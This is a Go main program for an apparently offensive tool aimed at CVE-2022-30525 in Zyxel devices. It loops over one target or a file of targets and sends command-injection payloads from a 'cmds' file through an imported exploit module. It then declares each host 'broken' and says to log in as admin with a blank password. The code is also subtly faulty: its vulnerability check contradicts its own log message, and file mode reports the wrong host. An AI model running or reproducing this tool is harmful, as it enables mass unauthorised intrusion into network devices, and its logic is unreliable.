package main

import (
	"bufio"
	"cve-2022-30525/exploit"
	"flag"
	"log"
	"os"
	"regexp"
	"strings"
	"time"
)

func readFile(filename string) []string {
	var ret []string
	file, err := os.Open(filename)
	if err != nil {
		log.Println("\n\033[31m Can not open FILE" + filename)
		log.Println("\033[34m" + err.Error())
		os.Exit(0)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		ret = append(ret, scanner.Text())
	}
	return ret
}

func main() {
	isFile := false
	target := flag.String(
		"t",
		"localhost",
		"Target url to attack",
	)
	flag.Parse()

	var ips []string
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	if match, _ := regexp.MatchString(ipv4Regex, *target); !match {
		isFile = true
		// reading file with targets
		ips = readFile(*target)
	}

	// reading cmd commands for Zyxel Break
	cmds := readFile("cmds")

	//checking if the parameter is URL or not
	if !isFile {
		for _, cmd := range cmds {
			log.Println("\n\033[34m[+] The target is in URL. Starting Attack..." + *target + " with command " + cmd)
			res := exploit.SendPOST(*target, cmd)
			if res != "" && !strings.Contains(res, "Service Unavailable") {
				log.Println("Status 503 or 500 is received. IP isn't Vulnerable for the " + *target)
				break
			}
			log.Println("The IP  " + *target + " is broken. Visit https://" + *target + " and login with admin and blank password.")
			time.Sleep(3 * time.Second)
		}
		os.Exit(0)
	} else {
		for _, ip := range ips {
			for _, cmd := range cmds {
				log.Println("\n\033[34m[+] The target is in URL. Starting Attack..." + ip + " with command " + cmd)
				res := exploit.SendPOST(ip, cmd)
				if res != "" && !strings.Contains(res, "Service Unavailable") {
					log.Println("Status 503 or 500 is received. IP isn't Vulnerable for the " + ip)
					break
				}
				log.Println("The IP  " + *target + " is broken. Visit https://" + *target + " and login with admin and blank password.")
				time.Sleep(3 * time.Second)
			}
			time.Sleep(5 * time.Second)
		}
	}
}
